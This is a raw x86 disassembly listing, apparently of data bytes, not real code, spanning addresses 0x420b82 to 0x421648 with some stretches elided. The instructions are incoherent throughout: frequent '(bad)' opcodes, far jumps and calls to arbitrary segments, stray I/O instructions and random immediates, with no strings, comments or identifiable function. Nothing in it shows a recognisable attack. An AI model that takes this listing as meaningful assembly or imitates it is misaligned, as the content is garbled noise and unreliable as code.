  420b82:	data16 arpl WORD PTR [ecx+0x4a0a3e5],ax
  420b89:	loop   0x420b53
  420b8b:	into   
  420b8c:	shl    BYTE PTR [ebx+ebp*4],1
  420b8f:	dec    eax
  420b90:	jmp    eax
  420b92:	add    BYTE PTR [ebp+0x2de8fcdd],0x3
  420b99:	imul   edi,DWORD PTR [esi-0x4b495614],0xffffffc4
  420ba0:	ret    
  420ba1:	or     dl,BYTE PTR ds:[eax]
  420ba4:	adc    eax,0x61729c86
  420ba9:	cmp    cl,ch
  420bab:	scas   eax,DWORD PTR es:[edi]
  420bac:	pop    ebp
  420bad:	pop    es
  420bae:	mov    cl,0x57
  420bb0:	scas   eax,DWORD PTR es:[edi]
  420bb1:	shr    BYTE PTR [eax+edi*8-0x6],cl
  420bb5:	adc    edx,0xd8e6a1ed
  420bbb:	mov    ebp,DWORD PTR [eax-0x14c8b6d0]
  420bc1:	add    BYTE PTR [ebp+0x23],dl
  420bc4:	ins    DWORD PTR es:[edi],dx
  420bc5:	push   ebp
  420bc6:	inc    edi
  420bc7:	aad    0x6
  420bc9:	pop    ebp
  420bca:	pop    ds
  420bcb:	cmp    bh,dl
  420bcd:	scas   al,BYTE PTR es:[edi]
  420bce:	enter  0xc897,0x4a
  420bd2:	mov    al,ds:0x8186a0b6
  420bd7:	pusha  
  420bd8:	dec    eax
  420bd9:	dec    edx
  420bda:	jmp    0x420bd3
  420bdc:	mov    eax,0x65ec0000
  420be1:	dec    eax
  420be2:	ja     0x420bad
  420be4:	addr16 loope 0x420c49
  420be7:	add    al,0x82
  420be9:	(bad)  
  420bea:	jbe    0x420bed
  420bec:	xchg   ecx,eax
  420bed:	cmp    DWORD PTR [esi+0x72],0x59
  420bf1:	mov    fs,WORD PTR [ecx+0x4c685700]
  420bf7:	push   es
  420bf8:	and    al,0x54
  420bfa:	ins    BYTE PTR es:[edi],dx
  420bfb:	jns    0x420bd2
  420bfd:	pop    edx
  420bfe:	aas    
  420bff:	pop    ecx
  420c00:	cmp    ch,BYTE PTR [edi]
  420c02:	sbb    al,0xdd
  420c04:	or     DWORD PTR [ebp-0x5e4cd3d4],esi
  420c0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c0b:	or     ah,ah
  420c0d:	dec    ecx
  420c0e:	mov    edi,0xadaba392
  420c13:	js     0x420c7b
  420c15:	adc    esp,esi
  420c17:	fimul  WORD PTR [eax+0x660364d3]
  420c1d:	fild   DWORD PTR [ebx-0x7a8307a2]
  420c23:	and    eax,ebp
  420c25:	mov    gs,WORD PTR [ebx]
  420c27:	mov    BYTE PTR [edx],bh
  420c29:	std    
  420c2a:	mov    al,ds:0x5672e45
  420c2f:	outs   dx,DWORD PTR ds:[esi]
  420c30:	(bad)  
  420c31:	mov    cl,0x16
  420c33:	retf   
  420c34:	xor    dh,al
  420c36:	scas   eax,DWORD PTR es:[edi]
  420c37:	mov    ch,bl
  420c39:	enter  0x53e8,0x55
  420c3d:	test   eax,0xd9f731ff
  420c42:	cmc    
  420c43:	mov    ebp,0x3deff24a
  420c48:	js     0x420cb4
  420c4a:	push   ss
  420c4b:	data16 jmp 0x420c09
  420c4e:	pop    esp
  420c4f:	sub    esi,DWORD PTR [edi]
  420c51:	test   eax,0xc3d61e7b
  420c56:	das    
  420c57:	je     0x420cb3
  420c59:	jge    0x420cc5
  420c5b:	sub    eax,DWORD PTR [eax+0x1d5760c4]
  420c61:	fiadd  DWORD PTR fs:[edx+edi*2+0x61]
  420c66:	mov    DWORD PTR [edx+0x3c],0xd7512dac
	...
  420cd5:	add    BYTE PTR [edx-0x604ef4eb],cl
  420cdb:	mov    edi,0x886e3fba
  420ce0:	add    ebp,esp
  420ce2:	retf   
  420ce3:	xor    eax,0x5fde7a1e
  420ce8:	add    DWORD PTR [eax],eax
  420cea:	inc    DWORD PTR [eax]
  420cec:	add    BYTE PTR [eax],al
  420cee:	repnz rol BYTE PTR [eax+0x23],1
  420cf2:	sbb    eax,0x6b2630b7
  420cf7:	inc    esi
  420cf8:	adc    DWORD PTR [ecx+0x5f],0x8f635f49
  420cff:	adc    BYTE PTR [edi],dh
  420d01:	xchg   ecx,eax
  420d02:	out    dx,eax
  420d03:	aad    0x5c
  420d05:	push   eax
  420d07:	xchg   edi,eax
  420d08:	sahf   
  420d09:	sbb    edi,edx
  420d0b:	aam    0x1d
  420d0d:	mov    ah,0xe5
  420d0f:	xor    ecx,esp
  420d11:	pop    edx
  420d12:	das    
  420d13:	mov    al,ds:0x77a3fa5f
  420d18:	mov    ds:0x61e60405,eax
  420d1d:	xchg   eax,ecx
  420d1f:	or     bl,dh
  420d21:	pop    ecx
  420d22:	mov    al,0xc2
  420d24:	add    esp,DWORD PTR [esi+0x7da7aa]
  420d2a:	(bad)  
  420d2b:	cmc    
  420d2c:	dec    edi
  420d2d:	sbb    al,0x7b
  420d2f:	push   esi
  420d30:	lds    ebx,FWORD PTR [edi+edi*1-0x557a2ad0]
  420d37:	cmc    
  420d38:	jae    0x420d97
  420d3a:	inc    edi
  420d3b:	(bad)
  420d3f:	repnz and ah,dh
  420d42:	pop    esp
  420d43:	xchg   ebp,eax
  420d44:	xchg   ecx,eax
  420d45:	mov    ch,0xed
  420d47:	push   0xf6c8bf
  420d4c:	add    BYTE PTR [edx],bh
  420d4e:	push   esp
  420d4f:	inc    ebx
  420d50:	inc    ecx
  420d51:	push   ebp
  420d52:	sbb    al,0x9c
  420d54:	(bad)  
  420d55:	adc    DWORD PTR [ecx-0x2b],ecx
  420d58:	jmp    0xb592:0xe5c7eca1
  420d5f:	jbe    0x420dd1
  420d61:	cmp    eax,0x915c75a6
  420d66:	jo     0x420d92
  420d68:	mov    ebx,0x581c4b03
  420d6d:	jno    0x420dee
  420d6f:	stos   BYTE PTR es:[edi],al
  420d70:	test   al,0x83
  420d72:	xlat   BYTE PTR ds:[ebx]
  420d73:	adc    al,0x45
  420d75:	xchg   eax,ebx
  420d77:	dec    ebx
  420d78:	out    0x13,eax
  420d7a:	(bad)  
  420d7c:	imul   ebx,edx,0xdd70e285
  420d82:	push   cs
  420d83:	test   eax,0xfa724c50
  420d88:	adc    BYTE PTR [esp+ecx*1-0x1981a2af],ch
  420d8f:	in     eax,0xe9
  420d91:	mov    dl,0xbd
  420d93:	unpckhps xmm5,xmm5
  420d96:	cmp    eax,0xbd48b915
  420d9b:	pushf  
  420d9c:	and    ebp,eax
  420d9e:	sbb    edx,ebx
  420da0:	test   al,0x39
  420da2:	xor    bl,BYTE PTR [ecx]
  420da4:	(bad)  
  420da6:	std    
  420da7:	dec    edi
  420da8:	iret   
  420da9:	or     ch,BYTE PTR fs:[eax+edx*1]
  420dad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420dae:	jge    0x420e0c
  420db0:	outs   dx,DWORD PTR ds:[esi]
  420db1:	push   0x6c
  420db3:	in     eax,0x71
  420db5:	(bad)  
  420db6:	mov    ch,0xa8
  420db8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420db9:	(bad)  
  420dbb:	cmp    DWORD PTR [esi],ecx
  420dbd:	jge    0x420df6
  420dbf:	lahf   
  420dc0:	sbb    eax,DWORD PTR [ecx+ebx*1]
  420dc3:	loope  0x420e22
  420dc5:	mov    ah,0x11
  420dc7:	gs inc ebp
  420dc9:	rol    BYTE PTR [eax],1
  420dcb:	das    
  420dcc:	mov    edx,0xf8ed256
  420dd1:	xor    bh,BYTE PTR [ebx+esi*1+0x34]
  420dd5:	in     eax,dx
  420dd6:	sbb    BYTE PTR [ebx-0x14],0x78
  420dda:	mov    edi,ds
  420ddc:	cld    
  420ddd:	xor    bh,BYTE PTR ds:0x8d68d959
  420de3:	xchg   ebx,eax
  420de4:	(bad)  
  420de6:	mov    edi,0xd8306377
  420deb:	jae    0x420de8
	...
  420e55:	add    bh,ah
  420e57:	push   ds
  420e58:	into   
  420e59:	push   0x9fe7f8ff
  420e5e:	push   esi
  420e5f:	inc    edi
  420e60:	lahf   
  420e61:	mov    al,ds:0xc0bb8907
  420e66:	frstor [eax+0x1]
  420e69:	add    bh,bh
  420e6b:	add    BYTE PTR [eax],al
  420e6d:	add    dh,bh
  420e6f:	and    edx,edi
  420e71:	aam    0x7a
  420e73:	inc    ecx
  420e74:	ret    0x1a49
  420e77:	fnstenv [ecx-0x6e]
  420e7a:	jl     0x420e0a
  420e7c:	xchg   edx,eax
  420e7d:	push   edi
  420e7e:	mov    esi,DWORD PTR [esi+eiz*1+0x54]
  420e82:	mov    ecx,0x9189943d
  420e87:	lock cs int 0x91
  420e8b:	fcom   DWORD PTR [ebp-0x47]
  420e8e:	cmp    al,0xc3
  420e90:	mov    esp,0x1acda68b
  420e95:	dec    ecx
  420e96:	lahf   
  420e97:	sub    ch,ah
  420e99:	dec    edi
  420e9a:	or     eax,0x9e26f63d
  420e9f:	loope  0x420e8f
  420ea1:	stc    
  420ea2:	or     BYTE PTR [ecx-0x63],cl
  420ea5:	lods   al,BYTE PTR ds:[esi]
  420ea6:	out    0xab,al
  420ea8:	out    dx,al
  420ea9:	(bad)  
  420eaa:	pop    esi
  420eab:	lahf   
  420eac:	xrstor [ebx+esi*4-0x19]
  420eb1:	add    BYTE PTR [ebp+eax*4+0x39],dl
  420eb5:	push   ebp
  420eb6:	lods   al,BYTE PTR ds:[esi]
  420eb7:	cmp    al,0x82
  420eb9:	ror    BYTE PTR [ebp-0x630ff5a4],0xdc
  420ec0:	mov    ds:0xd8a72baa,al
  420ec5:	add    al,0xcd
  420ec7:	push   0x5f8524bc
  420ecc:	call   0x691b:0x8d0be2d7
  420ed3:	cmp    ebx,DWORD PTR [esi]
  420ed5:	addr16 or al,0xc8
  420ed8:	call   0x47e33b2e
  420edd:	push   esp
  420ede:	or     ch,BYTE PTR [esi]
  420ee0:	les    eax,FWORD PTR cs:[ecx-0x16f59538]
  420ee7:	xor    eax,0x91ccba1
  420eec:	or     al,bl
  420eee:	loope  0x420ecc
  420ef0:	addr16 jp 0x420f1c
  420ef3:	lea    esp,[ebx]
  420ef5:	ss pushf 
  420ef7:	xchg   edx,eax
  420ef8:	iret   
  420ef9:	inc    edi
  420efa:	stos   BYTE PTR es:[edi],al
  420efb:	lea    eax,[ecx+0x731c93ab]
  420f01:	pop    ecx
  420f02:	popa   
  420f03:	sbb    al,0x11
  420f05:	shr    esi,1
  420f07:	and    ch,BYTE PTR [esi]
  420f09:	ins    BYTE PTR es:[edi],dx
  420f0a:	dec    edi
  420f0b:	retf   
  420f0c:	and    al,0x81
  420f0e:	xor    al,0xaa
  420f10:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f12:	mov    ch,0xca
  420f14:	jb     0x420f3a
  420f16:	mov    dl,0x96
  420f18:	xor    eax,DWORD PTR [ebp+esi*4+0xebeeb38]
  420f1f:	and    ah,ch
  420f21:	pop    ebp
  420f22:	sbb    bh,ah
  420f24:	inc    edx
  420f25:	icebp  
  420f26:	(bad)  
  420f27:	pop    esi
  420f28:	in     eax,0x52
  420f2a:	xor    BYTE PTR [edi-0x5bc96d5],0x60
  420f31:	jg     0x420f9e
  420f33:	xchg   esi,eax
  420f34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f35:	pop    ebp
  420f36:	fwait
  420f37:	mov    ebp,0xeb85a40f
  420f3c:	xchg   bl,dl
  420f3e:	jge    0x420eec
  420f40:	div    dh
  420f42:	and    al,0x13
  420f44:	je     0x420f97
  420f46:	mov    ds:0xa160bfd8,eax
  420f4b:	xchg   esi,eax
  420f4c:	xor    eax,0x3bbe3032
  420f51:	dec    esi
  420f52:	add    ecx,edi
  420f54:	mov    cl,0xd8
  420f56:	aaa    
  420f57:	xor    edx,DWORD PTR [esi]
  420f59:	sub    DWORD PTR [edi-0x737af876],edi
  420f5f:	mov    dl,0x5d
  420f61:	fs out 0x54,eax
  420f64:	push   0x5779f5a
  420f69:	ins    BYTE PTR es:[edi],dx
  420f6a:	es sti 
  420f6c:	aas    
	...
  420fd5:	add    BYTE PTR [eax],ah
  420fd7:	xchg   edi,eax
  420fd8:	inc    edx
  420fd9:	shl    edi,cl
  420fdb:	xlat   BYTE PTR ds:[ebx]
  420fdc:	mov    cl,0xf7
  420fde:	jg     0x420fcd
  420fe0:	or     esp,DWORD PTR [esi+0x1e636aa8]
  420fe6:	fsub   QWORD PTR [ecx+0x1]
  420fe9:	add    bh,bh
  420feb:	add    BYTE PTR [eax],al
  420fed:	add    BYTE PTR [ecx-0x45],ah
  420ff0:	jae    0x420f93
  420ff2:	sbb    eax,0x952855e6
  420ff7:	call   0x61b:0x632e0cd4
  420ffe:	mov    al,bh
  421000:	add    eax,0xa27223e6
  421005:	mul    bh
  421007:	mov    ds:0xc92a23a2,eax
  42100c:	outs   dx,BYTE PTR ds:[esi]
  42100d:	add    DWORD PTR [esp+ebp*1],0x30
  421011:	mov    esi,0x76f2e379
  421016:	lods   eax,DWORD PTR ds:[esi]
  421017:	vcvtps2pd ymm6,XMMWORD PTR [esp+ebp*4-0x23]
  42101d:	mov    ebp,0x80a079b
  421022:	frstor fs:[ebp+0x77a6854a]
  421029:	aam    0x23
  42102b:	dec    esp
  42102c:	jae    0x421051
  42102e:	mov    esp,0xf9948b51
  421033:	push   ss
  421034:	outs   dx,DWORD PTR ds:[esi]
  421035:	xchg   esi,eax
  421036:	mov    WORD PTR [esi],ss
  421038:	(bad)  
  421039:	cmp    ebx,DWORD PTR [esi+0x1d46b64d]
  42103f:	inc    esi
  421040:	adc    edx,DWORD PTR [edi-0x4d55cd63]
  421046:	cmp    BYTE PTR [edi+0x35b7ee60],dh
  42104c:	add    BYTE PTR [ebx],cl
  42104e:	mov    ds:0x2190f43c,al
  421053:	retf   
  421054:	pop    ebp
  421055:	or     DWORD PTR [ecx+0x7fe834d1],0x71
  42105c:	pop    ebx
  42105d:	ins    DWORD PTR es:[edi],dx
  42105e:	iret   
  42105f:	rcr    BYTE PTR [esi+0x41],1
  421062:	jle    0x421033
  421064:	add    eax,ebx
  421066:	mov    bl,0xdf
  421068:	pop    eax
  421069:	pushf  
  42106a:	mov    ds:0x17957b34,eax
  42106f:	test   DWORD PTR [edi+ebx*4+0x48],esi
  421073:	jmp    0x142d:0x9f1148be
  42107a:	fistp  WORD PTR [ebp+0x4748e1c8]
  421080:	inc    BYTE PTR [ebx]
  421082:	jb     0x4210d9
  421084:	and    eax,0x18f76f14
  421089:	not    BYTE PTR [esi+0x3c8d12d8]
  42108f:	and    ah,BYTE PTR [ecx]
  421091:	push   ss
  421092:	aam    0x8
  421094:	pop    esi
  421095:	sbb    BYTE PTR [esi],dh
  421097:	int3   
  421098:	mov    ecx,0x17d2f48a
  42109d:	pusha  
  42109e:	test   BYTE PTR [edi],bl
  4210a0:	or     eax,0x453ccd5d
  4210a5:	imul   eax,DWORD PTR [esi-0x26],0x54
  4210a9:	repnz retf 0x962f
  4210ad:	pop    eax
  4210ae:	(bad)  
  4210af:	out    dx,eax
  4210b0:	int3   
  4210b1:	int3   
  4210b2:	pop    edi
  4210b3:	aam    0x80
  4210b5:	and    al,0x1c
  4210b7:	push   0xffffffd6
  4210b9:	mov    esp,0xfe5f7204
  4210be:	or     eax,0x472de665
  4210c3:	inc    edi
  4210c4:	cld    
  4210c5:	es je  0x421099
  4210c8:	jl     0x4210b9
  4210ca:	sar    DWORD PTR [ebx],cl
  4210cc:	adc    BYTE PTR [edx],dl
  4210ce:	imul   esi,DWORD PTR [ebx-0x7d],0x47
  4210d2:	mov    esp,0xc784bbef
  4210d7:	and    cl,bl
  4210d9:	xchg   ebp,eax
  4210da:	fist   DWORD PTR [ebp+0x2e]
  4210dd:	adc    BYTE PTR [ecx+eiz*1],cl
  4210e0:	lods   al,BYTE PTR ds:[esi]
  4210e1:	addr16 aas 
  4210e3:	mov    esi,0xb44862f1
  4210e8:	in     eax,dx
  4210e9:	ja     0x4210fd
  4210eb:	dec    eax
  4210ec:	push   cs
	...
  421155:	add    BYTE PTR [edi-0x243925a2],bl
  42115b:	(bad)  
  42115c:	lahf   
  42115d:	pop    edi
  42115e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42115f:	jne    0x421143
  421161:	mov    es,WORD PTR [ebp-0x24d39fb0]
  421167:	bound  eax,QWORD PTR [ecx]
  421169:	add    bh,bh
  42116b:	add    BYTE PTR [eax],al
  42116d:	add    BYTE PTR [ecx],ah
  42116f:	cli    
  421170:	bound  ebx,QWORD PTR [esi+0x70]
  421173:	inc    edi
  421174:	add    BYTE PTR [ebp+0x50425977],dl
  42117a:	js     0x421195
  42117c:	pop    ss
  42117d:	pushf  
  42117e:	mov    ebp,0xb42bb2cc
  421183:	lds    edi,FWORD PTR [ebx-0x2c]
  421186:	dec    edx
  421187:	xor    eax,0x84e5dc8a
  42118c:	mov    ebp,0x32e5a9e3
  421191:	cmp    edx,DWORD PTR [eax+0x37]
  421194:	arpl   WORD PTR [ebp+0x2c],ax
  421197:	add    ecx,DWORD PTR [ecx-0x7c1f02ce]
  42119d:	jmp    0x315d2caf
  4211a2:	shr    DWORD PTR [ebx],cl
  4211a4:	das    
  4211a5:	pop    ebp
  4211a6:	stc    
  4211a7:	sbb    al,al
  4211a9:	ret    
  4211aa:	mov    eax,0x7c179121
  4211af:	xor    BYTE PTR [esi-0x72],dh
  4211b2:	mov    al,0xf5
  4211b4:	mov    ch,0xfd
  4211b6:	xchg   ch,bl
  4211b8:	xor    ebx,esi
  4211ba:	shl    al,1
  4211bc:	js     0x4211f7
  4211be:	iret   
  4211bf:	lock fld QWORD PTR [ecx+0x34]
  4211c3:	call   FWORD PTR [eax]
  4211c5:	or     cl,ah
  4211c7:	call   0x797e:0xa5092f6a
  4211ce:	dec    edx
  4211cf:	pushf  
  4211d0:	das    
  4211d1:	icebp  
  4211d2:	xor    BYTE PTR [eax],bl
  4211d4:	imul   edx,DWORD PTR ds:0x6595f929,0x39
  4211db:	jg     0x4211f5
  4211dd:	lock ins BYTE PTR es:[edi],dx
  4211df:	xor    al,0x15
  4211e1:	hlt    
  4211e2:	and    DWORD PTR [edx+ebx*4-0x51],esp
  4211e6:	pop    es
  4211e7:	or     ebp,DWORD PTR [edx]
  4211e9:	fistp  DWORD PTR [edi-0x3a1b3a36]
  4211ef:	stos   DWORD PTR es:[edi],eax
  4211f0:	into   
  4211f1:	and    eax,esi
  4211f3:	xchg   ebx,eax
  4211f4:	(bad)  
  4211f5:	push   edx
  4211f6:	arpl   WORD PTR [edx-0x7ec15c92],cx
  4211fc:	adc    ah,BYTE PTR [ebp+0x28]
  4211ff:	mov    edi,0x11bcdc37
  421204:	mov    ds:0xf292693e,eax
  421209:	inc    edx
  42120a:	inc    edx
  42120b:	push   0x222f328b
  421210:	lds    ebx,FWORD PTR [esi]
  421212:	ret    
  421213:	bound  ebx,QWORD PTR [edi]
  421215:	or     bh,BYTE PTR [ebx+0x4665b64a]
  42121b:	aas    
  42121c:	ds imul esp,esp,0x47
  421220:	xchg   edi,eax
  421221:	(bad)  
  421222:	mov    bl,0xa1
  421224:	xchg   edi,eax
  421225:	call   0xd0c569aa
  42122a:	dec    eax
  42122b:	mov    ds:0xbff5ba17,eax
  421230:	push   es
  421231:	adc    al,0xde
  421233:	jge    0x421229
  421235:	lds    ecx,FWORD PTR [ebp-0xd59162e]
  42123b:	out    0x8,eax
  42123d:	cmp    BYTE PTR [ebp+0x46],0x8b
  421241:	fdiv   QWORD PTR [eax-0xd]
  421244:	dec    eax
  421245:	sub    eax,0xe712fc2e
  42124a:	loop   0x4212b5
  42124c:	out    0xe8,al
  42124e:	mov    ebx,0x5d209372
  421253:	sub    DWORD PTR [esi],edi
  421255:	js     0x4212b9
  421257:	data16 clc 
  421259:	sub    esi,esi
  42125b:	inc    eax
  42125c:	and    BYTE PTR [edx],ah
  42125e:	or     ebp,ecx
  421260:	push   esp
  421261:	enter  0x3884,0x37
  421265:	jne    0x421264
  421267:	jne    0x42128c
  421269:	leave  
  42126a:	xchg   ecx,eax
  42126b:	add    al,bl
	...
  4212d5:	add    BYTE PTR [esi-0x700870e1],bl
  4212db:	idiv   esi
  4212dd:	jg     0x42129c
  4212df:	sub    eax,0xe6b67ab3
  4212e4:	(bad)  
  4212e5:	enter  0x63da,0x1
  4212e9:	add    bh,bh
  4212eb:	add    BYTE PTR [eax],al
  4212ed:	add    BYTE PTR [ebx],ah
  4212ef:	test   eax,0x906dc12c
  4212f4:	aam    0x63
  4212f6:	jns    0x4212fa
  4212f8:	sbb    BYTE PTR [edi+0x57ddaad4],ch
  4212fe:	jno    0x421344
  421300:	outs   dx,DWORD PTR ds:[esi]
  421301:	sbb    eax,DWORD PTR [edx-0x39]
  421304:	mov    esi,0xdce0d0f4
  421309:	dec    edi
  42130a:	and    bl,BYTE PTR [eax]
  42130c:	jmp    0x41e7:0xab34d79f
  421313:	push   0xc6d4efea
  421318:	js     0x42137b
  42131a:	ror    esi,1
  42131c:	ficom  DWORD PTR [ebp-0x9]
  42131f:	sub    dl,BYTE PTR [edi+edi*4+0x5c]
  421323:	adc    eax,0xd6422316
  421328:	inc    ecx
  421329:	add    DWORD PTR [eax+0x6f],ebx
  42132c:	call   0xe567:0xcbd91490
  421333:	push   es
  421334:	cli    
  421335:	fs loopne 0x42139a
  421338:	mov    ecx,DWORD PTR [ebx+edx*1]
  42133b:	inc    esp
  42133c:	push   ds
  42133d:	pop    edx
  42133e:	pop    esp
  42133f:	or     WORD PTR [eax+0xf],bx
  421343:	or     BYTE PTR [eax+0x3c91ca02],ah
  421349:	lods   al,BYTE PTR ds:[esi]
  42134a:	iret   
  42134b:	add    DWORD PTR [edx+0x3ec464de],0x42a074e5
  421355:	pop    edx
  421356:	test   DWORD PTR [edx],ecx
  421358:	ins    BYTE PTR es:[edi],dx
  421359:	mov    esi,DWORD PTR [eax]
  42135b:	mov    ds:0x6ef1288a,al
  421360:	or     DWORD PTR [esi+0x4fd26add],edi
  421366:	(bad)  [edx-0x17]
  421369:	sub    eax,0xe161a420
  42136e:	test   BYTE PTR [ebx-0x1b],dh
  421371:	(bad)  
  421372:	mov    al,0x8e
  421374:	jno    0x4213ce
  421376:	sub    DWORD PTR [esi-0x25],ebp
  421379:	fwait
  42137a:	sub    eax,0xf7c5263c
  42137f:	xchg   ecx,eax
  421380:	jmp    0x4213dd
  421382:	rcl    BYTE PTR [ebp+0x638853f1],cl
  421388:	mov    al,0xba
  42138a:	add    DWORD PTR [eax+0x59a829ab],0x6f
  421391:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421392:	xor    eax,0x79c0d8fc
  421397:	pop    esp
  421398:	cmc    
  421399:	stc    
  42139a:	test   al,0xb2
  42139c:	dec    edx
  42139d:	(bad)  
  42139e:	sub    al,0x35
  4213a0:	mov    ?,WORD PTR [ecx+0x65]
  4213a3:	and    al,0xf4
  4213a5:	dec    ebp
  4213a6:	pop    ebp
  4213a7:	xchg   esi,eax
  4213a8:	jb     0x42136b
  4213aa:	test   eax,0xe294a863
  4213af:	lods   al,BYTE PTR ds:[esi]
  4213b0:	xchg   ebx,eax
  4213b1:	or     BYTE PTR [edi-0x3],bh
  4213b4:	(bad)  
  4213b5:	call   DWORD PTR [edi-0x4dd57cf0]
  4213bb:	(bad)  
  4213bd:	pop    es
  4213be:	inc    eax
  4213bf:	enter  0x6462,0xf9
  4213c3:	sub    al,BYTE PTR [eax+0x227d70cf]
  4213c9:	add    dl,BYTE PTR [edi+0x4a14efa]
  4213cf:	push   cs
  4213d0:	jo     0x4213ea
  4213d2:	add    BYTE PTR [ebx],0x8a
  4213d5:	into   
  4213d6:	out    dx,al
  4213d7:	(bad)  
  4213d8:	mov    ebx,0xd80857f8
  4213dd:	push   esi
  4213de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213df:	jge    0x421452
  4213e1:	jge    0x421422
  4213e3:	pop    esi
  4213e4:	pop    ebp
  4213e5:	loopne 0x421374
  4213e7:	int    0x15
  4213e9:	test   DWORD PTR [esi],edi
  4213eb:	inc    esi
  4213ec:	lahf   
	...
  421455:	add    dh,bh
  421457:	(bad)  
  421458:	pop    esp
  421459:	mov    eax,ds:0xdfffbb7d
  42145e:	fstp   DWORD PTR [ebp-0x49b20b61]
  421464:	push   ss
  421465:	iret   
  421466:	fldenv [ecx+eax*1+0x0]
  42146a:	inc    DWORD PTR [eax]
  42146c:	add    BYTE PTR [eax],al
  42146e:	mov    WORD PTR [ecx-0x3cfb3fa5],gs
  421474:	xor    ebx,edx
  421476:	ins    DWORD PTR es:[edi],dx
  421477:	mov    ch,BYTE PTR [esi]
  421479:	iret   
  42147a:	inc    edi
  42147b:	inc    BYTE PTR [ecx+0x77]
  42147e:	aad    0xfa
  421480:	mov    ds:0x4cc7273a,eax
  421485:	(bad)  
  421486:	je     0x421424
  421488:	sbb    BYTE PTR [ebp+0x5020f31b],cl
  42148e:	inc    esi
  42148f:	inc    ecx
  421490:	inc    edx
  421491:	xchg   ebp,eax
  421492:	loop   0x4214bf
  421494:	pop    eax
  421495:	xor    eax,0xd3b7c1e3
  42149a:	push   ss
  42149b:	fdivr  QWORD PTR [edi-0x476b5561]
  4214a1:	jb     0x4214f3
  4214a3:	push   edx
  4214a4:	mov    edx,0x1ae7999f
  4214a9:	ins    DWORD PTR es:[edi],dx
  4214aa:	pop    esp
  4214ab:	inc    ebp
  4214ac:	(bad)  
  4214ad:	ficomp DWORD PTR [eax]
  4214af:	push   0xfe007b04
  4214b4:	push   es
  4214b5:	repz sub al,0xe3
  4214b8:	dec    ebp
  4214b9:	mov    ebp,0x4b105125
  4214be:	push   ecx
  4214bf:	fsubp  st(2),st
  4214c1:	(bad)  
  4214c2:	ja     0x4214a2
  4214c4:	sub    BYTE PTR [bx-0x20fc],ch
  4214c9:	cmp    BYTE PTR [ecx-0x7412b2c6],0xd8
  4214d0:	cmp    al,0x9c
  4214d2:	aam    0xa6
  4214d4:	fs add eax,0x1000f1e4
  4214da:	add    ecx,esi
  4214dc:	arpl   WORD PTR [edi],bp
  4214de:	push   cs
  4214df:	popf   
  4214e0:	adc    al,ah
  4214e2:	pop    ss
  4214e3:	sbb    ebp,DWORD PTR [edx]
  4214e5:	sar    DWORD PTR [esi-0x36],cl
  4214e8:	retf   
  4214e9:	xor    eax,0xf1fef27a
  4214ee:	adc    eax,0xa1c2b91a
  4214f3:	sar    DWORD PTR [esi+0x1c],cl
  4214f6:	mov    eax,0x7d11cae9
  4214fb:	hlt    
  4214fc:	xchg   ecx,eax
  4214fd:	mov    ds:0x3f10109e,eax
  421502:	pop    esp
  421503:	mov    ah,0x77
  421505:	pop    esp
  421506:	imul   esp,eax,0x2d79efe4
  42150c:	rol    ah,1
  42150e:	xor    edx,ebx
  421510:	into   
  421511:	out    0x43,eax
  421513:	sbb    eax,0xab937acd
  421518:	jae    0x4214f6
  42151a:	jmp    0x499:0xcada3a7e
  421521:	dec    ebx
  421522:	push   cs
  421523:	mov    ebp,0x36e5f148
  421529:	(bad)  
  42152a:	fild   WORD PTR [eiz*4-0x5b956833]
  421531:	dec    edx
  421532:	push   es
  421533:	xchg   ebp,eax
  421534:	mov    eax,0x942a3863
  421539:	mov    ds:0x75b4f06,eax
  42153e:	sub    ebp,edi
  421540:	cwde   
  421541:	jmp    0x1a1127a3
  421546:	xchg   edx,eax
  421547:	xchg   ebp,eax
  421548:	mov    dh,0x2b
  42154a:	pop    ds
  42154b:	xchg   edx,eax
  42154c:	pop    ebp
  42154d:	sbb    ebx,eax
  42154f:	sbb    ah,bh
  421551:	outs   dx,BYTE PTR ds:[esi]
  421552:	and    al,0x69
  421554:	cmp    ecx,DWORD PTR [edi]
  421556:	aaa    
  421557:	xchg   ecx,eax
  421558:	scas   al,BYTE PTR es:[edi]
  421559:	lods   eax,DWORD PTR ds:[esi]
  42155a:	push   ds
  42155b:	test   DWORD PTR [esi+0x2c],ebx
  42155e:	aam    0x4f
  421560:	das    
  421561:	or     BYTE PTR [ecx-0x74eb6690],0x13
  421568:	and    al,0xe6
  42156a:	push   ds
  42156b:	jne    0x42156a
	...
  4215d5:	add    dh,dl
  4215d7:	repnz test BYTE PTR [eax],bl
  4215da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215db:	jle    0x4215bb
  4215dd:	(bad)  
  4215de:	arpl   WORD PTR [eax-0x2b93bd4c],bp
  4215e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4215e5:	(bad)  
  4215e6:	fsub   DWORD PTR [ebp+0x1]
  4215e9:	add    bh,bh
  4215eb:	add    BYTE PTR [eax],al
  4215ed:	add    BYTE PTR [ecx+0x7d],ah
  4215f0:	es leave 
  4215f2:	loop   0x4215b8
  4215f4:	fnsave [eax]
  4215f6:	retf   0x81d6
  4215f9:	addr16 push ecx
  4215fb:	iret   
  4215fc:	mov    edi,0x222fb24b
  421601:	jo     0x4215b5
  421603:	push   ebp
  421604:	ss aaa 
  421606:	(bad)  
  421608:	push   esp
  421609:	mov    ebx,0x6542296
  42160e:	mov    ebp,0xac57c40e
  421613:	retf   
  421614:	push   ebx
  421615:	jmp    DWORD PTR [ecx]
  421617:	loope  0x421695
  421619:	enter  0x4798,0x5
  42161d:	in     eax,dx
  42161e:	adc    BYTE PTR [edx-0xc],0x33
  421622:	mov    ebp,0x806d8ba3
  421627:	jp     0x42167e
  421629:	fsubr  QWORD PTR ds:[edx+ebx*2-0x2d43e137]
  421631:	push   DWORD PTR [esi]
  421633:	std    
  421634:	in     eax,dx
  421635:	cmp    eax,0x465f0ea5
  42163a:	lahf   
  42163b:	fnstsw WORD PTR [ebx-0xae201b]
  421641:	bound  ebx,QWORD PTR [ebx]
  421643:	call   0x2ecb815c
  421648:	test   al,0xdb
